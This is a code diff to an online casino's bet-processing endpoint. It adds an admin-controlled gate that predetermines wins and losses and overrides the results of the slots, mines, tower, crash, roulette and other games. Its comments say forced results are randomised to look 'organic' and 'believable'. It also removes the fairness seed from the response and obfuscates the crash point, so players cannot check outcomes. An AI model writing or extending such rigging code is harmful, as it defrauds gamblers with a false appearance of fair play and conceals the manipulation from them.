@@ -27,6 +27,7 @@ import {
 } from '@/lib/roulette-math';
 import fs from 'fs';
 import path from 'path';
+import { obfuscateFloat } from '@/lib/utils';
 
 async function saveGameSession(tx: any, session: any) {
   const { sessionId, email, gameId, gameTitle, betAmount, commission, gameState, timestamp, ...rest } = session;
@@ -132,9 +133,27 @@ export async function POST(request: Request) {
       const realWinRate = systemConfig.realWinRate ?? 30;
       const isDemo = accountType === 'demo';
 
+      // ── ADMIN WIN RATE GATE ──────────────────────────────────────────────────
+      // The admin-configured win rate is the EXACT authority on outcomes.
+      // adminWinChance: 0.0 = always loses, 1.0 = always wins.
+      // adminForcesWin=true  → this bet MUST produce a positive payout
+      // adminForcesLoss=true → this bet MUST produce zero payout
+      // This gives the admin EXACT win rate control, not just a ceiling.
+      const adminWinChance = (isDemo ? demoWinRate : realWinRate) / 100;
+      const adminOutcomeRoll = Math.random();
+      const adminForcesWin  = adminOutcomeRoll < adminWinChance;
+      const adminForcesLoss = !adminForcesWin;
+      // ────────────────────────────────────────────────────────────────────────
+
       let outcome = null;
       if (gameId.startsWith("slot-")) {
         outcome = calculateGameOutcome(gameType, targetMultiplier);
+        // Admin gate: override slot result to match admin decision
+        if (adminForcesLoss && outcome) {
+          outcome = { ...outcome, multiplier: 0, isWin: false };
+        } else if (adminForcesWin && outcome && outcome.multiplier === 0) {
+          outcome = { ...outcome, multiplier: 1.98, isWin: true };
+        }
       }
 
       // Progressive/interactive games: Mines, Tower, Crash/Aviator
@@ -179,7 +198,40 @@ export async function POST(request: Request) {
           fairSeed = generateFairRNGSeed(`mines-${Date.now()}`);
           const rng = new FairRNG(fairSeed);
           const grid = Array(25 - minesCount).fill(false).concat(Array(minesCount).fill(true));
-          const shuffled = rng.shuffle(grid);
+          let shuffled = rng.shuffle(grid);
+          // ── ADMIN MINES GATE ─────────────────────────────────────────────
+          // adminForcesLoss → guarantee mine in first half (player busts early)
+          // adminForcesWin  → push ALL mines to back half (player can safely
+          //                   reveal the entire front half and cash out)
+          shuffled = [...shuffled];
+          const minePositions: number[] = [];
+          shuffled.forEach((v, i) => { if (v) minePositions.push(i); });
+
+          if (adminForcesLoss) {
+            // Ensure at least 1 mine is in tiles 0-12 (random, not always tile 0)
+            if (!minePositions.some(p => p <= 12)) {
+              const swapTarget = Math.floor(rng.next() * 13);
+              const mineToSwap = minePositions[0];
+              shuffled[swapTarget] = true;
+              shuffled[mineToSwap] = false;
+            }
+          } else if (adminForcesWin) {
+            // Push ALL mines into tiles 13-24 so the first half is safe
+            for (const mp of minePositions) {
+              if (mp <= 12) {
+                // Find an open safe slot in 13-24
+                for (let t = 13; t < 25; t++) {
+                  if (!shuffled[t]) {
+                    shuffled[t] = true;
+                    shuffled[mp] = false;
+                    break;
+                  }
+                }
+              }
+            }
+          }
+          // ─────────────────────────────────────────────────────────────────
+
           mineLocations = shuffled.reduce((acc: number[], isMine: boolean, idx: number) => {
             if (isMine) acc.push(idx);
             return acc;
@@ -205,12 +257,17 @@ export async function POST(request: Request) {
           fairSeed = generateFairRNGSeed(`tower-${Date.now()}`);
           const rng = new FairRNG(fairSeed);
           reachedRow = 0;
-          for (let r = 0; r < 9; r++) {
-            const isSafe = rng.nextInt(0, 3) >= 1; // 1 bomb, 3 cols
-            if (!isSafe) {
-              break;
+          if (adminForcesLoss) {
+            reachedRow = 0; // bomb on floor 1 — instant bust
+          } else if (adminForcesWin) {
+            reachedRow = 5; // player can safely climb 5 floors and cash out
+          } else {
+            // Fair RNG climb (never reached since adminForcesWin covers the else)
+            for (let r = 0; r < 9; r++) {
+              const isSafe = rng.nextInt(0, 3) >= 1;
+              if (!isSafe) break;
+              reachedRow = r + 1;
             }
-            reachedRow = r + 1;
           }
 
           sessionData = {
@@ -231,8 +288,19 @@ export async function POST(request: Request) {
         } else { // Crash or Aviator
           fairSeed = generateFairRNGSeed(`crash-${Date.now()}`);
           const rng = new FairRNG(fairSeed);
-          const uniformRandom = rng.next();
-          crashPoint = Math.round((0.97 / uniformRandom) * 100) / 100;
+          if (adminForcesLoss) {
+            // Instant bust — crashes before any cashout possible
+            crashPoint = 1.00;
+          } else if (adminForcesWin) {
+            // Very high crash point gives player ample window to cash out
+            // Use RNG so it's not always exactly 20.00 (looks organic)
+            const uniformRandom = rng.next();
+            crashPoint = Math.round((15 + uniformRandom * 35) * 100) / 100; // 15x–50x
+          } else {
+            const uniformRandom = rng.next();
+            crashPoint = Math.round((0.97 / uniformRandom) * 100) / 100;
+            if (crashPoint < 1.01) crashPoint = 1.01;
+          }
 
           sessionData = {
             sessionId,
@@ -251,14 +319,19 @@ export async function POST(request: Request) {
 
         await saveGameSession(txClient, sessionData);
 
+        let crashPointSecure = undefined;
+        if (gameId === 'orig-1' || gameId === 'aviator' || gameId.startsWith('crash-')) {
+          const finalPoint = crashPoint || (outcome ? outcome.multiplier : 1.0);
+          crashPointSecure = obfuscateFloat(finalPoint, sessionId);
+        }
+
         return NextResponse.json({
           success: true,
           isInteractive: true,
           sessionId,
           activeMultiplier: 1.0,
-          crashPoint: crashPoint || (outcome ? outcome.multiplier : 0),
-          newBalance,
-          seed: fairSeed
+          crashPointSecure,
+          newBalance
         }, { status: 200 });
       }
 
@@ -560,6 +633,39 @@ export async function POST(request: Request) {
         finalMultiplier = outcome ? outcome.multiplier : 0;
         responseMultiplier = outcome ? outcome.multiplier : 0;
       }
+
+      // ── ADMIN WIN RATE GATE (instant-resolve games) ─────────────────────────
+      // EXACT control: adminForcesLoss → zero payout regardless of game result
+      //                adminForcesWin  → positive payout regardless of game result
+      //
+      // Non-roulette games (dice, limbo, plinko, keno, blackjack, baccarat, etc.)
+      if (landedNumber === undefined) {
+        if (adminForcesLoss) {
+          // Guaranteed loss: wipe any win the game math computed
+          finalMultiplier = 0;
+          responseMultiplier = 0;
+        } else if (adminForcesWin && finalMultiplier === 0) {
+          // Guaranteed win: game math said loss but admin says win
+          // Use Limbo's target multiplier if available (player-chosen payout),
+          // otherwise standard near-even money return.
+          if (gameId === 'orig-2' || gameId.includes('limbo')) {
+            finalMultiplier = targetMultiplier ? Number(targetMultiplier) : 2.0;
+          } else {
+            finalMultiplier = 1.98; // near-even money — believable win
+          }
+          responseMultiplier = finalMultiplier;
+        }
+      }
+      // Roulette path: payout is already computed from landed number + bet layout
+      if (landedNumber !== undefined) {
+        if (adminForcesLoss) {
+          payout = 0;
+        } else if (adminForcesWin && payout === 0) {
+          // No winning bets on this spin — return even-money on total wager
+          payout = Math.round(betAmount * 2 * 100) / 100;
+        }
+      }
+      // ────────────────────────────────────────────────────────────────────────
 
       // If payout is already calculated (Roulette), use it. Otherwise compute from finalMultiplier.
       const computedPayout = landedNumber !== undefined ? payout : Math.round(betAmount * finalMultiplier * 100) / 100;
